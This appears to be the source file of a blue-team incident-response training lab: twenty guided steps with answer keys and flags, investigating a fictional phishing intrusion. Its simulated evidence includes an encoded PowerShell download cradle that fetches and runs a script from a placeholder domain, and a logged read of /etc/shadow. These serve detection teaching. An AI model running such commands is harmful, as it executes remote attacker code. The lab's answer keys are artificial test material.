'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#4dd0e1'
const moduleId = 'blue-team'
const moduleName = 'Blue Team & Incident Response'
const moduleNum = '14'

// Scenario: corp.example (fictional). All domains are reserved (.example / .test) and all IPs are
// RFC1918 (10.0.0.0/8) or documentation ranges (192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24).
// Windows paths are written with forward slashes on purpose (no backslashes in template literals).

const steps: LabStep[] = [
  // ── SECTION 1: Alert triage on the Linux bastion ─────────────────────────
  {
    id: 'bt-01',
    title: 'Night Shift: First Alert',
    objective: `22:35 UTC, Tuesday. You are the on-call SOC analyst for corp.example. The SIEM raises:

  [HIGH] SSH authentication failures above threshold - host bastion01 (10.20.0.15)

bastion01 is the Linux jump host that administrators use to reach production. You have a shell on a read-only copy of its logs.

Show every failed SSH password attempt recorded in /var/log/auth.log.`,
    hint: 'grep for the exact phrase sshd writes on a bad password: "Failed password". Quote it because it contains a space.',
    answers: ['grep "Failed password" /var/log/auth.log', "grep 'Failed password' /var/log/auth.log", 'grep -i "failed password" /var/log/auth.log', 'grep "Failed password" auth.log'],
    xp: 15,
    explanation: `Output (truncated, 1,299 lines):
  Nov  3 22:05:13 bastion01 sshd[48211]: Failed password for invalid user oracle from 198.51.100.23 port 51122 ssh2
  Nov  3 22:14:40 bastion01 sshd[48530]: Failed password for root from 203.0.113.9 port 40114 ssh2
  Nov  3 22:29:51 bastion01 sshd[48907]: Failed password for svc_backup from 10.20.30.42 port 50702 ssh2
  Nov  3 22:29:52 bastion01 sshd[48909]: Failed password for svc_backup from 10.20.30.42 port 50706 ssh2
  ...

Why this first: sshd logs one line per failed attempt with the user and source IP. "invalid user" means the account does not exist locally, which points to wordlist guessing. On RHEL-family systems the file is /var/log/secure; on minimal modern installs without rsyslog you would use journalctl -u ssh instead.`
  },
  {
    id: 'bt-02',
    title: 'Rank the Sources',
    objective: `The output scrolls for pages. Reading it line by line will not tell you who the main attacker is.

A colleague has already extracted the source IP of every failure into failed_ips.txt (one IP per line).

Count how many failures came from each IP and list the noisiest source first.`,
    hint: 'uniq -c only collapses adjacent duplicates, so sort first. Then sort the counts numerically in reverse: sort | uniq -c | sort -nr',
    answers: ['sort failed_ips.txt | uniq -c | sort -nr', 'sort failed_ips.txt | uniq -c | sort -rn', 'cat failed_ips.txt | sort | uniq -c | sort -nr', 'cat failed_ips.txt | sort | uniq -c | sort -rn'],
    xp: 20,
    explanation: `Output:
     1284 10.20.30.42
       12 198.51.100.23
        3 203.0.113.9

This is stacking in its simplest form. The two public IPs are background internet noise that every exposed SSH server sees. The top source is different: 10.20.30.42 is INTERNAL, in the finance workstation VLAN (10.20.30.0/24).

A workstation hammering a jump host 1,284 times is not a user mistyping a password. It almost always means the workstation itself is compromised and is being used to move laterally. This finding changes the severity of the whole alert.`
  },
  {
    id: 'bt-03',
    title: 'Did Anything Succeed?',
    objective: `An internal host making 1,284 guesses is bad. An internal host that eventually GOT IN is an incident.

Search /var/log/auth.log for successful SSH logins (sshd writes "Accepted" for every successful authentication).`,
    hint: 'Same file, different keyword: grep "Accepted" /var/log/auth.log',
    answers: ['grep "Accepted" /var/log/auth.log', "grep 'Accepted' /var/log/auth.log", 'grep Accepted /var/log/auth.log', 'grep "Accepted password" /var/log/auth.log'],
    flag: 'GHOST{svc_backup_got_in}',
    xp: 20,
    explanation: `Output:
  Nov  3 19:02:11 bastion01 sshd[41102]: Accepted publickey for j.ndungu from 10.20.0.50 port 61220 ssh2: ED25519 SHA256:q9X...
  Nov  3 22:31:09 bastion01 sshd[49011]: Accepted password for svc_backup from 10.20.30.42 port 50826 ssh2

Then, two minutes later in the same file:
  Nov  3 22:33:40 bastion01 sudo: svc_backup : TTY=pts/1 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow

Compare the two logins. The admin logged in with a key from the admin VLAN: normal. svc_backup, a SERVICE account, logged in interactively with a password from a finance workstation, straight after a guessing run, and immediately used sudo to read password hashes. Service accounts should never log in interactively. You now have a confirmed compromise. Escalate to a P2 incident and keep going.`
  },

  // ── SECTION 2: Pivot to Active Directory ─────────────────────────────────
  {
    id: 'bt-04',
    title: 'Splunk: Failed Windows Logons',
    objective: `svc_backup is an Active Directory account (bastion01 authenticates users against AD through SSSD). If the attacker guessed its password, they may have attacked the domain too.

In Splunk, write a search over index=wineventlog for failed logons (EventCode 4625) and count them per target account. The target account field is TargetUserName.`,
    hint: 'Select the events, then pipe into stats: index=wineventlog EventCode=4625 | stats count by TargetUserName',
    answers: ['index=wineventlog EventCode=4625 | stats count by TargetUserName', 'index=wineventlog EventID=4625 | stats count by TargetUserName', 'index=wineventlog EventCode=4625 | stats count by Account_Name', 'index=wineventlog EventCode=4625 | stats count by user'],
    xp: 25,
    explanation: `Output (last 4 hours, host=DC01):
  TargetUserName   count
  a.patel          2
  b.osei           2
  c.wambui         2
  d.reyes          2
  ... (63 accounts in total)
  svc_backup       2
  Total: 126 events, every one with IpAddress=10.20.30.42, Logon_Type=3, Sub_Status=0xC000006A, between 21:40:12 and 21:43:30

SPL is a pipeline: the first part selects events, then each | passes results to the next command. stats count by FIELD is the workhorse aggregation of every SOC.

Field names depend on how the data was onboarded: the XML Windows add-on gives TargetUserName, older classic-format data gives Account_Name, and the CIM Authentication data model normalises it to user. Always check the raw event before trusting a field name.`
  },
  {
    id: 'bt-05',
    title: 'Name the Attack Pattern',
    objective: `Look at the shape of that result:

  - 63 different accounts
  - exactly 2 failures per account
  - all from one source (10.20.30.42) inside about 3 minutes
  - SubStatus 0xC000006A (valid username, wrong password)
  - the domain lockout threshold is 5 attempts

This is not classic brute force (many guesses against ONE account). What is this credential attack technique called?`,
    hint: 'Few passwords, many accounts, staying under the lockout threshold. ATT&CK T1110.003.',
    answers: ['password spray', 'spraying', 'spray', 'T1110.003'],
    xp: 20,
    explanation: `Password spraying (MITRE ATT&CK T1110.003). The attacker tries one or two common passwords (Autumn2026!, Welcome1, CompanyName2026) against every account they can enumerate, staying under the lockout threshold so nobody gets locked out and no helpdesk tickets appear.

A follow-up search shows it worked:
  index=wineventlog EventCode=4624 IpAddress=10.20.30.42 TargetUserName=svc_backup
  21:43:51  DC01  4624  Logon_Type=3  TargetUserName=svc_backup  AuthenticationPackage=NTLM

Detection takeaway: per-account failure thresholds miss spraying completely. Alert on dc(TargetUserName) per source instead, for example more than 20 distinct accounts failing from one IP in 10 minutes. Logon Type 3 (network) is what SMB and most lateral movement tools produce.`
  },

  // ── SECTION 3: Patient zero ──────────────────────────────────────────────
  {
    id: 'bt-06',
    title: 'Find Patient Zero',
    objective: `10.20.30.42 resolves to WS-FIN-042, the laptop of m.hale in Finance. Something on that machine is spraying the domain and guessing SSH passwords. How did it start?

Command-line auditing is enabled, so Windows process creation events (EventCode 4688) include the full command line.

Write an SPL search over index=wineventlog for EventCode 4688 where the CommandLine field contains -enc anywhere (use wildcards and quotes).`,
    hint: 'Wildcards go inside the quoted value: CommandLine="*-enc*". Add host=WS-FIN-042 if you like.',
    answers: ['index=wineventlog EventCode=4688 CommandLine="*-enc*"', 'index=wineventlog EventCode=4688 host=WS-FIN-042 CommandLine="*-enc*"', 'index=wineventlog EventCode=4688 Process_Command_Line="*-enc*"', 'index=wineventlog EventCode=4688 CommandLine=*-enc*'],
    xp: 25,
    explanation: `Output (1 event):
  _time:              2026-11-03 21:17:44
  host:               WS-FIN-042
  EventCode:          4688
  SubjectUserName:    m.hale
  ParentProcessName:  C:/Windows/explorer.exe
  NewProcessName:     C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe
  CommandLine:        powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHQAZQBsAGUAbQBlAHQAcgB5AC4AZQB4AGEAbQBwAGwAZQAvAHMALwB1AHAAZAAuAHAAcwAxACcAKQA=

Three red flags in one line: -nop (ignore the user profile), -w hidden (no visible window) and -enc (base64-encoded command, which hides the real code from casual inspection). explorer.exe as the parent means the user launched it by double-clicking something. That is your patient zero, 26 minutes before the spray began.`
  },
  {
    id: 'bt-07',
    title: 'Map the Execution to ATT&CK',
    objective: `The email gateway confirms the start of the chain:

  21:02:10  To: m.hale@corp.example  Subject: "Q4 invoice overdue - final notice"
            Attachment: Invoice_Q4.zip  (contains Invoice_Q4.pdf.lnk)
            Sender: accounts@billing-portal.test  Verdict: delivered (no malicious signature)

Invoice_Q4.pdf.lnk is a Windows shortcut disguised as a PDF. m.hale opened the ZIP and double-clicked it, and the shortcut ran PowerShell.

Which MITRE ATT&CK sub-technique ID describes a user executing a malicious file?`,
    hint: 'Tactic: Execution. Technique: User Execution (T1204). The sub-technique for files (as opposed to links) is .002.',
    answers: ['T1204.002', 'User Execution: Malicious File', 'malicious file'],
    xp: 20,
    explanation: `T1204.002 - User Execution: Malicious File.

Mapping the whole opening of this intrusion:
  T1566.001  Phishing: Spearphishing Attachment   (initial access - the email)
  T1036.007  Masquerading: Double File Extension  (.pdf.lnk shows as a PDF)
  T1204.002  User Execution: Malicious File       (the double-click)
  T1059.001  Command and Scripting Interpreter: PowerShell

After Microsoft blocked internet macros by default in 2022, attackers moved to LNK files in ZIP, ISO or IMG containers, HTML smuggling and OneNote files. ATT&CK mapping is what lets you ask "do we detect each of these steps?" and build coverage, instead of chasing one sample at a time.`
  },
  {
    id: 'bt-08',
    title: 'Decode the Payload',
    objective: `You have saved the -enc blob from the command line into blob.b64.

PowerShell -EncodedCommand is base64 of UTF-16LE text. Decode the file so you can read the real command. (Piping through iconv to convert UTF-16LE to UTF-8 is optional but gives clean output.)`,
    hint: 'base64 -d blob.b64   or   base64 -d blob.b64 | iconv -f utf-16le -t utf-8',
    answers: ['base64 -d blob.b64', 'base64 --decode blob.b64', 'cat blob.b64 | base64 -d', 'base64 -d blob.b64 | iconv -f utf-16le -t utf-8'],
    xp: 25,
    explanation: `Output (via iconv):
  IEX (New-Object Net.WebClient).DownloadString('https://cdn-telemetry.example/s/upd.ps1')

Without iconv you see the same text with a null byte after every character (I.E.X. .(.N.e.w.-...), the giveaway that it is UTF-16LE.

This is a classic download cradle: DownloadString fetches a second-stage script into memory and IEX (Invoke-Expression) runs it, so the stage-two code never touches disk. That is exactly why PowerShell Script Block Logging (event 4104) matters: it records the de-obfuscated code that IEX actually executed. CyberChef's "From Base64" plus "Decode text (UTF-16LE)" recipe does the same job in a browser.`
  },
  {
    id: 'bt-09',
    title: 'Identify the C2 Domain',
    objective: `Read the decoded command again:

  IEX (New-Object Net.WebClient).DownloadString('https://cdn-telemetry.example/s/upd.ps1')

What is the domain the payload was downloaded from (and the first candidate for the attacker's command-and-control infrastructure)?`,
    hint: 'The hostname between https:// and the first / of the path.',
    answers: ['cdn-telemetry.example', 'https://cdn-telemetry.example/s/upd.ps1'],
    xp: 20,
    explanation: `cdn-telemetry.example

Attackers pick names that blend in: "cdn", "telemetry", "update", "sync" and "cloud" appear in thousands of legitimate domains, so a name alone proves nothing. What makes it suspicious is the context: it was contacted by hidden PowerShell, from a phishing payload, and (as the proxy confirms) never by any other host in the organisation.

The proxy log for the download:
  2026-11-03T21:17:46Z user=m.hale src=10.20.30.42 GET https://cdn-telemetry.example/s/upd.ps1 200 4821 ua="... WindowsPowerShell/5.1"

Record it as an IOC now: you will need it to scope DNS, block at the proxy and resolver, and query threat intel.`
  },

  // ── SECTION 4: Network and endpoint evidence ────────────────────────────
  {
    id: 'bt-10',
    title: 'Check the DNS Logs',
    objective: `Your working directory is /logs/zeek, which holds Zeek logs from the core network sensor.

Search dns.log for every query for cdn-telemetry.example, to learn which hosts resolved it and when.`,
    hint: 'grep for the domain in dns.log. Quotes are optional because the domain has no spaces.',
    answers: ['grep cdn-telemetry.example dns.log', 'grep "cdn-telemetry.example" dns.log', "grep 'cdn-telemetry.example' dns.log", 'cat dns.log | grep cdn-telemetry.example'],
    xp: 20,
    explanation: `Output (ts, uid, id.orig_h, ..., query, qtype, rcode, answers):
  1793740665.204  CnR4...  10.20.30.42  ...  cdn-telemetry.example  A  NOERROR  192.0.2.66
  1793740745.611  C1xP...  10.20.30.42  ...  cdn-telemetry.example  A  NOERROR  192.0.2.66
  1793740805.093  CqE8...  10.20.30.42  ...  cdn-telemetry.example  A  NOERROR  192.0.2.66
  1793740866.402  Cz0L...  10.20.30.42  ...  cdn-telemetry.example  A  NOERROR  192.0.2.66
  ... 98 more, all from 10.20.30.42

Three findings:
  1. Only ONE internal host ever resolved it, so the infection is (so far) contained to WS-FIN-042.
  2. It resolves to 192.0.2.66 - a second IOC to block and scope.
  3. After 21:19 the queries repeat roughly every 60 seconds: a beacon. Zeek ts values are Unix epoch seconds; 1793740665 is 2026-11-03 21:17:45 UTC. Use zeek-cut -d to print human-readable times.`
  },
  {
    id: 'bt-11',
    title: 'Sysmon: Which Process Is Beaconing?',
    objective: `DNS tells you which HOST resolved the domain, not which PROGRAM. WS-FIN-042 runs Sysmon, and its events are in index=sysmon.

Write an SPL search for Sysmon network connection events (Event ID 3) to the C2 IP 192.0.2.66. In this index the event ID field is EventCode and the destination field is DestinationIp.`,
    hint: 'index=sysmon EventCode=3 DestinationIp=192.0.2.66',
    answers: ['index=sysmon EventCode=3 DestinationIp=192.0.2.66', 'index=sysmon EventID=3 DestinationIp=192.0.2.66', 'index=sysmon EventCode=3 DestinationIp="192.0.2.66"', 'index=sysmon EventCode=3 dest_ip=192.0.2.66'],
    xp: 25,
    explanation: `Output (| stats count min(_time) max(_time) by Image, ProcessId, User):
  Image                                              PID   User                  count  first     last
  C:/Windows/System32/WindowsPowerShell/v1.0/powershell.exe  7312  CORP/m.hale     2      21:17:46  21:18:57
  C:/ProgramData/UpdSvc/updsvc.exe                   8012  NT AUTHORITY/SYSTEM   196    21:19:05  22:41:12

The story sharpens. PowerShell made the first connections (downloading stage two), then a NEW binary, updsvc.exe in ProgramData, took over beaconing every ~60 seconds, running as SYSTEM. A user-level phish has become SYSTEM-level persistence.

Sysmon Event ID 3 ties network activity to a process image, hash and user, something firewall and Zeek logs cannot do.`
  },
  {
    id: 'bt-12',
    title: 'How Did It Persist?',
    objective: `updsvc.exe runs as SYSTEM with parent services.exe, which strongly suggests it was installed as a Windows service.

Which Windows System log Event ID records that a new service was installed?`,
    hint: 'It is in the System log (Service Control Manager), not Security. Four digits, starts with 70.',
    answers: ['7045', 'EventCode=7045', 'event 7045'],
    xp: 20,
    explanation: `Event ID 7045 - "A service was installed in the system" (System log, source Service Control Manager).

  index=wineventlog EventCode=7045 host=WS-FIN-042
  21:19:02  ServiceName=UpdSvc  ImagePath=C:/ProgramData/UpdSvc/updsvc.exe  ServiceType=user mode service  StartType=auto start  AccountName=LocalSystem

ATT&CK T1543.003 - Create or Modify System Process: Windows Service. If "Audit Security System Extension" is enabled you also get Security event 4697 with the same detail.

Stacking 7045 across the fleet (chapter 5) is a high-value hunt: UpdSvc exists on exactly one host, runs from ProgramData and is unsigned. Legitimate services are usually installed on many machines from Program Files by a signed installer.`
  },
  {
    id: 'bt-13',
    title: 'Write the Detection: Sigma',
    objective: `Time to make sure the next one is caught automatically. You are drafting a Sigma rule for hidden, encoded PowerShell. Complete the blank field line:

  logsource:
    category: process_creation
    product: windows
  detection:
    selection_img:
      OriginalFileName: 'PowerShell.EXE'
    selection_enc:
      ____________________:
        - ' -enc '
        - ' -e '
    condition: all of selection_*

The value must match anywhere in the full command line, AND also match the same flags written with a slash (/enc) or a dash variant. Give the field name followed by its modifiers.`,
    hint: 'Field: CommandLine. Modifiers are chained with |. You need "contains" plus the modifier that expands - into / and dash variants: windash.',
    answers: ['CommandLine|contains|windash', 'CommandLine|windash|contains', 'CommandLine|contains|windash:'],
    xp: 25,
    explanation: `CommandLine|contains|windash

  contains  - match the value anywhere in the field (Sigma matching is case-insensitive by default)
  windash   - also generate variants where the leading - is replaced by /, an en dash, an em dash or a horizontal bar. PowerShell accepts all of them, and attackers use /enc or an en dash to dodge naive rules.

Using OriginalFileName instead of Image means the rule still fires if the attacker copies powershell.exe to C:/Users/Public/notepad.exe: the PE version resource still says PowerShell.EXE.

Convert and test it:
  sigma convert -t splunk -p sysmon proc_creation_win_powershell_enc_hidden.yml
Then commit it with a true-positive sample (this incident's 4688 event) and a benign sample, so CI proves it works.`
  },

  // ── SECTION 5: Containment and IOCs ──────────────────────────────────────
  {
    id: 'bt-14',
    title: 'Contain the Host',
    objective: `The IR lead approves immediate containment: the attacker holds a domain service account, has root on the bastion, and is actively beaconing. Waiting to scope further is not worth the risk.

Your EDR has a CLI with this syntax:
  edrctl isolate --host <hostname>

Network-isolate WS-FIN-042. (The EDR keeps its own management channel open, so you can still collect evidence remotely after isolation.)`,
    hint: 'edrctl isolate --host WS-FIN-042',
    answers: ['edrctl isolate --host WS-FIN-042', 'edrctl isolate --host WS-FIN-042.corp.example', 'edrctl isolate WS-FIN-042'],
    xp: 20,
    explanation: `Output:
  [edrctl] Isolation requested for WS-FIN-042 (agent 4f2c-91ab)
  [edrctl] Status: CONTAINED at 22:47:31 UTC - all traffic blocked except EDR cloud channel

(Real equivalents: "Isolate device" in Microsoft Defender for Endpoint, "Network contain" in CrowdStrike Falcon, "Disconnect from network" in SentinelOne - all also available via API for SOAR playbooks.)

Containment is never just one host. In parallel the playbook says:
  - disable svc_backup in AD and reset its password; revoke m.hale's sessions and reset her password
  - block cdn-telemetry.example and 192.0.2.66 at DNS, proxy and firewall
  - isolate or rebuild bastion01: root was obtained and /etc/shadow was read
  - DO NOT power off WS-FIN-042: memory holds evidence you are about to need`
  },
  {
    id: 'bt-15',
    title: 'Hash the Implant',
    objective: `The EDR retrieved a copy of the implant into your evidence folder /evidence/WS-FIN-042/, and you are working in that folder.

Compute the SHA-256 hash of updsvc.exe so you can search for it across the fleet and in threat intelligence.`,
    hint: 'On Linux: sha256sum <file>',
    answers: ['sha256sum updsvc.exe', 'sha256sum /evidence/WS-FIN-042/updsvc.exe', 'sha256sum ./updsvc.exe', 'Get-FileHash updsvc.exe -Algorithm SHA256'],
    xp: 20,
    explanation: `Output:
  7c1e4f9a2b08d36e5a91c0f47b2de83a6f150c9d84e2b7a3061fd5c8e92a4b17  updsvc.exe

Record it in the evidence log and chain of custody alongside the time and who collected it.

Uses of the hash:
  - fleet sweep in EDR: any other host with this file?  (result: 0 other hosts)
  - threat intel lookup and sandbox reports
  - blocklist in EDR (custom indicator)

Remember the Pyramid of Pain: a hash is the cheapest thing for an attacker to change. Recompiling or adding one byte gives a new hash. Use it, but do not rely on it; your Sigma rule on behaviour is the durable detection.`
  },
  {
    id: 'bt-16',
    title: 'Threat Intel Lookup',
    objective: `Your threat intelligence platform (backed by MISP) has a CLI:
  ti lookup <indicator>

Look up the C2 domain to see whether anyone in your sharing community has seen it before.`,
    hint: 'ti lookup cdn-telemetry.example',
    answers: ['ti lookup cdn-telemetry.example', 'ti lookup 192.0.2.66', 'ti lookup 7c1e4f9a2b08d36e5a91c0f47b2de83a6f150c9d84e2b7a3061fd5c8e92a4b17'],
    flag: 'GHOST{pivot_to_backup_c2}',
    xp: 20,
    explanation: `Output:
  MATCH  cdn-telemetry.example  (domain)  confidence 85  TLP:AMBER
  Event #4471 "GreyFinch - invoice LNK campaign targeting logistics finance teams" (fictional training cluster)
    first_seen 2026-10-21  last_seen 2026-11-02  source: sector ISAC
    related attributes:
      ip-dst     192.0.2.66
      sha256     7c1e4f9a...4a4b17   (filename updsvc.exe)   <- matches your sample
      domain     backup-cdn-sync.example                    <- fallback C2, not yet seen here
    tags: misp-galaxy:mitre-attack-pattern="T1110.003", "T1543.003", "T1204.002"

Intel just paid for itself twice: it confirms attribution to a known campaign with known TTPs, and it hands you a FALLBACK C2 domain. Block backup-cdn-sync.example now and search DNS for it - attackers switch to backups as soon as the primary is blocked. Then share your new findings (bastion pivot, svc_backup) back to the community.`
  },

  // ── SECTION 6: Timeline and memory forensics ─────────────────────────────
  {
    id: 'bt-17',
    title: 'Build the Timeline',
    objective: `You have exported the key events from the mail gateway, Sysmon, proxy, Zeek, DC01 and bastion01 into timeline.csv. The first column is a UTC timestamp in ISO 8601 format (2026-11-03T21:17:44Z) and fields are comma-separated.

Sort the file chronologically by the first column.`,
    hint: 'sort with comma as the field separator (-t,) and key on field 1 only (-k1,1).',
    answers: ['sort -t, -k1,1 timeline.csv', 'sort -t , -k1,1 timeline.csv', 'sort -t, -k1 timeline.csv', 'sort timeline.csv'],
    xp: 25,
    explanation: `Output:
  2026-11-03T21:02:10Z,mail,WS-FIN-042,m.hale receives Invoice_Q4.zip
  2026-11-03T21:17:44Z,4688,WS-FIN-042,powershell -nop -w hidden -enc (parent explorer.exe)
  2026-11-03T21:17:46Z,proxy,WS-FIN-042,GET cdn-telemetry.example/s/upd.ps1
  2026-11-03T21:18:58Z,sysmon11,WS-FIN-042,updsvc.exe written to ProgramData
  2026-11-03T21:19:02Z,7045,WS-FIN-042,service UpdSvc installed
  2026-11-03T21:19:05Z,zeek,WS-FIN-042,60s beacon to 192.0.2.66 begins
  2026-11-03T21:40:12Z,4625,DC01,password spray: 63 accounts x2
  2026-11-03T21:43:51Z,4624,DC01,svc_backup logon type 3
  2026-11-03T22:29:51Z,auth.log,bastion01,SSH guessing for svc_backup
  2026-11-03T22:31:09Z,auth.log,bastion01,Accepted password for svc_backup
  2026-11-03T22:33:40Z,auth.log,bastion01,sudo cat /etc/shadow
  2026-11-03T22:35:00Z,siem,-,alert fires
  2026-11-03T22:47:31Z,edr,WS-FIN-042,host isolated

ISO 8601 UTC timestamps sort correctly as plain text, which is exactly why every source must be normalised to UTC first. Time to detect: 21:17 to 22:35 = 78 minutes. Time to contain: 12 minutes after the alert.`
  },
  {
    id: 'bt-18',
    title: 'Memory Forensics: Process List',
    objective: `Before tightening isolation, the EDR captured memory from WS-FIN-042 to /evidence/WS-FIN-042/WS-FIN-042.mem (you are in that folder).

Use Volatility 3 (the vol command) to list the running processes from the image with the windows.pslist plugin.`,
    hint: 'vol -f <image> <plugin>   ->   vol -f WS-FIN-042.mem windows.pslist',
    answers: ['vol -f WS-FIN-042.mem windows.pslist', 'vol.py -f WS-FIN-042.mem windows.pslist', 'python3 vol.py -f WS-FIN-042.mem windows.pslist', 'vol -f WS-FIN-042.mem windows.pslist.PsList'],
    xp: 25,
    explanation: `Output (abridged):
  PID   PPID  ImageFileName    Offset(V)       Threads  SessionId  CreateTime
  4     0     System           0xa48c1c086040  198      N/A        2026-11-03 07:58:12
  688   560   services.exe     0xa48c1f2d5080  9        0          2026-11-03 07:58:20
  4120  4092  explorer.exe     0xa48c22b1e080  82       1          2026-11-03 08:04:51
  7312  4120  powershell.exe   0xa48c25c3a300  14       1          2026-11-03 21:17:44
  8012  688   updsvc.exe       0xa48c26a17080  6        0          2026-11-03 21:19:03

Read it like a process tree: powershell.exe (7312) is a child of explorer.exe, matching the 4688 event; updsvc.exe (8012) is a child of services.exe (688) in session 0, matching a service. Memory independently corroborates the logs.

Next steps an analyst would run: windows.pstree, windows.cmdline (recover the full -enc string), windows.psscan (find hidden or exited processes and diff against pslist), and windows.malfind --pid 8012 (look for injected code).`
  },
  {
    id: 'bt-19',
    title: 'Memory Forensics: Network Connections',
    objective: `Now confirm, from memory alone, which process owns the C2 connection and whether the implant also did the lateral movement.

Run the Volatility 3 plugin that scans the memory image for TCP/UDP network objects.`,
    hint: 'Same command shape as before, plugin windows.netscan',
    answers: ['vol -f WS-FIN-042.mem windows.netscan', 'vol.py -f WS-FIN-042.mem windows.netscan', 'python3 vol.py -f WS-FIN-042.mem windows.netscan', 'vol -f WS-FIN-042.mem windows.netstat'],
    xp: 25,
    explanation: `Output (filtered to PIDs 7312 and 8012):
  Proto  LocalAddr    LocalPort  ForeignAddr  ForeignPort  State        PID   Owner
  TCPv4  10.20.30.42  50227      192.0.2.66   443          ESTABLISHED  8012  updsvc.exe
  TCPv4  10.20.30.42  50826      10.20.0.15   22           CLOSED       8012  updsvc.exe
  TCPv4  10.20.30.42  49981      10.20.0.10   445          CLOSED       8012  updsvc.exe
  TCPv4  10.20.30.42  50133      192.0.2.66   443          CLOSED       7312  powershell.e

This closes the loop. updsvc.exe holds the live C2 session AND has recent connections to bastion01:22 (the SSH guessing) and DC01:445 (SMB, where the password spray happened). Source port 50826 even matches the "Accepted password" line in auth.log.

windows.netscan scans memory for connection structures (it can find closed and stale ones); windows.netstat walks the live tables. Using both is common practice.`
  },
  {
    id: 'bt-20',
    title: 'Incident Summary',
    objective: `06:00. Shift handover. Your incident summary reads:

  "A finance user opened a malicious .pdf.lnk shortcut inside a ZIP attachment. Hidden encoded PowerShell downloaded a second stage from cdn-telemetry.example, installed the UpdSvc service as SYSTEM, sprayed passwords against 63 domain accounts, compromised svc_backup, and used it to gain root on bastion01. The host was isolated 12 minutes after the first alert."

For the report header: what was the INITIAL ACCESS technique that started this intrusion? (A name or an ATT&CK ID is accepted.)`,
    hint: 'How did the payload reach the user? An email with an attachment. ATT&CK T1566.001.',
    answers: ['phishing', 'spearphishing attachment', 'T1566.001', 'T1566'],
    flag: 'GHOST{night_shift_survived}',
    xp: 35,
    explanation: `Initial access: Phishing - Spearphishing Attachment (T1566.001).

Full chain for the report:
  Initial access    T1566.001  Spearphishing attachment (Invoice_Q4.zip)
  Execution         T1204.002 + T1059.001  LNK -> hidden encoded PowerShell
  Persistence       T1543.003  UpdSvc Windows service (SYSTEM)
  Credential access T1110.003  Password spraying against AD; T1110.001 SSH guessing
  Lateral movement  T1021.004  SSH to bastion01 with valid account (T1078.002)
  C2                T1071.001  HTTPS beacon to cdn-telemetry.example / 192.0.2.66

Root causes: LNK-in-ZIP not blocked at the mail gateway, a weak password on a service account allowed to log in interactively, and no MFA on the bastion. Recommendations: block LNK/ISO attachments, move svc_backup to a gMSA with no interactive logon rights, enforce MFA on bastion01, deploy the new Sigma and spray-correlation rules, and run a purple-team retest.

Then sleep. You have earned it.`
  },
]

export default function BlueTeamLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    try {
      const saved = localStorage.getItem('lab_blue-team-lab')
      if (saved) {
        const d = JSON.parse(saved)
        if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
      }
    } catch {}
  }, [])

  const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#4a7a80' }}>
        <Link href="/" style={{ color: '#4a7a80', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/blue-team" style={{ color: '#4a7a80', textDecoration: 'none' }}>BLUE TEAM &amp; IR</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/blue-team" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #16343a', borderRadius: '3px', color: '#4a7a80', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(77,208,225,0.1)', border: '1px solid rgba(77,208,225,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(77,208,225,0.04)', border: '1px solid rgba(77,208,225,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' as const }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#16343a', border: p.active ? '2px solid ' + accent : '1px solid #16343a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#2a5a60', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#16343a', margin: '0 2px' }}>—</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#4a7a80' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP &nbsp;·&nbsp; {steps.length} STEPS
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE ({earnedXp} XP) — LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* Section index */}
      <div style={{ background: 'rgba(77,208,225,0.02)', border: '1px solid rgba(77,208,225,0.08)', borderRadius: '6px', padding: '12px 16px', marginBottom: '1.5rem', fontFamily: 'JetBrains Mono, monospace' }}>
